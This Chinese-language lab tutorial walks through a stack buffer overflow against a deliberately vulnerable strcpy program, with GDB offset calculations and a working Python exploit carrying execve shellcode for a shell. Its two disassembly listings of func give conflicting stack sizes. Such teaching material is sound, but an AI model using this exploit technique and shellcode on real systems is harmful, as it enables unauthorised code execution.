# 环境
- Ubuntu 14.04 i386


# 知识准备
- 掌握栈在函数调用过程中的关键作用，及工作原理
- 理解栈中几个关键过程，如栈桢的创建，EBP和返回地址关系，目标缓冲区与返回地址之间偏移计算
- GDB + PEDA的基本用法
- SHellcode的原理

# 实验目标
- 通过经典栈溢出示例，理解栈溢出的原理，思路
- 能结合GDB，计算及写出溢出攻击脚本


# 实验步骤
## 环境准备：

关闭ASLR：

```
echo 0 > /proc/sys/kernel/randomize_va_space
```
在编译时，需要关闭栈保护功能：
- 参数：-fno-stack-protector ,用于关闭栈保护功能
- 参数：-z execstack ，用于关闭栈的NX属性，即栈内不可执行的限制


## 漏洞程序

vuln.c :

```
/*
 * =====================================================================================
 *
 *       Filename:  vuln.c
 *
 *    Description:  经典栈溢出示例，漏洞代码
 *
 *        Version:  1.0
 *        Created:  2018年03月24日 18时27分13秒
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  YOUR NAME (), 
 *   Organization:  
 *   Complile : gcc -g -o vuln -fno-stack-protector -z execstack vuln.c
 *   #echo 0 > /proc/sys/kernel/randomize_va_space
 *
 * =====================================================================================
 */
#include <stdio.h>
#include <string.h>

void func(char *str)
{
    char buf[56];
    strcpy(buf,str);
    
}
int main(int argc, char *argv[])
{
    func(argv[1]); 
    return 0;
}

```
### 编译：

```
gcc -g -o vuln -fno-stack-protector -z execstack vuln.c

```

### 漏洞原理
在函数func中有一个局部变量buf，类型是字符数组，但缺少长度的限制，造成易被攻击，实现任意代码执行。


为了更清晰看到栈分布，我们在汇编层去看栈的操作过程及其分布

```
gdb-peda$ disassemble func
Dump of assembler code for function func:
   0x0804841d <+0>:	push   ebp
   0x0804841e <+1>:	mov    ebp,esp
   0x08048420 <+3>:	sub    esp,0x118
   0x08048426 <+9>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048429 <+12>:	mov    DWORD PTR [esp+0x4],eax
   0x0804842d <+16>:	lea    eax,[ebp-0x108]
   0x08048433 <+22>:	mov    DWORD PTR [esp],eax
   0x08048436 <+25>:	call   0x80482f0 <strcpy@plt>
   0x0804843b <+30>:	leave  
   0x0804843c <+31>:	ret    
End of assembler dump.

gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x0804843d <+0>:	push   ebp
   0x0804843e <+1>:	mov    ebp,esp
   0x08048440 <+3>:	and    esp,0xfffffff0
   0x08048443 <+6>:	sub    esp,0x10
   0x08048446 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048449 <+12>:	add    eax,0x4
   0x0804844c <+15>:	mov    eax,DWORD PTR [eax]
   0x0804844e <+17>:	mov    DWORD PTR [esp],eax
   0x08048451 <+20>:	call   0x804841d <func>
   0x08048456 <+25>:	mov    eax,0x0
   0x0804845b <+30>:	leave  
   0x0804845c <+31>:	ret    
End of assembler dump.

```
我们这里通过动态调试，查看栈的实时数据


```
// 在func函数入口处添加断点，以观察此时的栈数据
b func  

// 运行程序
r
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0xb7fc3000 --> 0x1aada8 
ECX: 0x164b6c8 
EDX: 0xbffff0c4 --> 0xb7fc3000 --> 0x1aada8 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff078 --> 0xbffff098 --> 0x0 
ESP: 0xbffff020 --> 0xbffff0d4 --> 0x38b172d8 
EIP: 0x8048423 (<func+6>:	mov    eax,DWORD PTR [ebp+0x8])
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804841d <func>:	push   ebp
   0x804841e <func+1>:	mov    ebp,esp
   0x8048420 <func+3>:	sub    esp,0x58
=> 0x8048423 <func+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x8048426 <func+9>:	mov    DWORD PTR [esp+0x4],eax
   0x804842a <func+13>:	lea    eax,[ebp-0x40]
   0x804842d <func+16>:	mov    DWORD PTR [esp],eax
   0x8048430 <func+19>:	call   0x80482f0 <strcpy@plt>
[------------------------------------stack-------------------------------------]
0000| 0xbffff020 --> 0xbffff0d4 --> 0x38b172d8 
0004| 0xbffff024 --> 0xbffff048 --> 0xb7e24bf8 --> 0x2aa0 
0008| 0xbffff028 --> 0xbffff040 --> 0xffffffff 
0012| 0xbffff02c --> 0x804823d ("__libc_start_main")
0016| 0xbffff030 --> 0xb7fff938 --> 0x0 
0020| 0xbffff034 --> 0x0 
0024| 0xbffff038 --> 0xc2 
0028| 0xbffff03c --> 0xb7eadd56 (<handle_intel+102>:	test   eax,eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, func (str=0x0) at vuln.c:26

```
重点观察其EBP，ESP，的地址：
- ESP: 0xbffff020
- EBP: 0xbffff078

字符数组buf的起始地址：


```
gdb-peda$ p &buf
$1 = (char (*)[56]) 0xbffff038
gdb-peda$ p 0xbffff078 - 0xbffff038
$2 = 0x40

```
可以看到buf到ebp的距离为0x40,即64个字符，这里也可以根据func的汇编代码看到它们之间的间距：

```
   0x804842a <func+13>:	lea    eax,[ebp-0x40]
   0x804842d <func+16>:	mov    DWORD PTR [esp],eax  #准备buf参数
```


其栈分布图为：

![image](http://on44nkxjb.bkt.clouddn.com/18-3-25/44922655.jpg)



溢出攻击的目标位置其实就是func函数执行结束时的返回地址，也就是func函数栈桢起始处EBP的后面一个位置。那么buf到返回地址的存放位置间距就是64+4 ,即68个字符。

也就是说向buf字符数组中放68个以上的字符就会覆盖返回地址了。


测试：向buf中存放72个字符，看运行结果：


```
gdb-peda$ r `python -c 'print "A"*68 + "B"*4'`
Starting program: /home/magc/workspace/sec_experiements99/7_experiment/vuln `python -c 'print "A"*68 + "B"*4'`
```
运行结果：

![image](http://on44nkxjb.bkt.clouddn.com/18-3-25/14918793.jpg)

可以看到EIP的内容变成了4个B字符，所以验证了前面的buf与返回地址之间的间距。并且确认了准确长度和位置，后面就可以精确攻击，在Buf中存放自己的Shellcode代码，将返回地址改为Shellcode的起始地址了。

### 攻击程序


```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import struct
from subprocess import call

# 攻击的目标位置：func函数返回地址存放位置
ret_addr = 0xbffff080

# Shellcode 代码，用于创建一个root权限的Shell
scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"


# 转换函数，将数字转换成16进制码

def conv(num):
    return struct.pack("<I",num)
buf = "A"*68
buf += conv(ret_addr)
# shellcode到buf的间距是72字节，故ret_addr的内容就是buf地址再加72字节
buf += scode
buf += "\x90"

print "Calling vulnerable program!!!"
call(["./vuln",buf])
```

现在的关键点在于ret_addr是多少，它代表着Shellcode的起始地址，这于它在buf中的存放位置有关系，根据上面py脚本中的位置，可以算出scode的起始位置与buf的起点偏移是72字节，所以，关键是找到buf的地址，ret_addr = &buf + 0x48 。

再次重申，一定要关闭ASLR，不然，每次运行的buf的地址都是变化的，攻击也就无法瞄准目标了。

通过GDB 断点在func开始处，打印一下&buf值就可以知道它的值了：

```
gdb-peda$ p &buf
$1 = (char (*)[56]) 0xbffff038
gdb-peda$ p 0xbffff038+0x48
$2 = 0xbffff080
```
得到ret_addr的值后，攻击脚本就算可用了，运行测试：

```
magc@magc-VirtualBox:~/workspace/sec_experiements99/7_experiment$ python exploit.py 
Calling vulnerable program!!!
#   
```
可以看出，前缀符已经变成#，表示已经获得root权限了。攻击成功！！！
















# 参考
- http://www.csyssec.org/20161230/stackbufferflow/
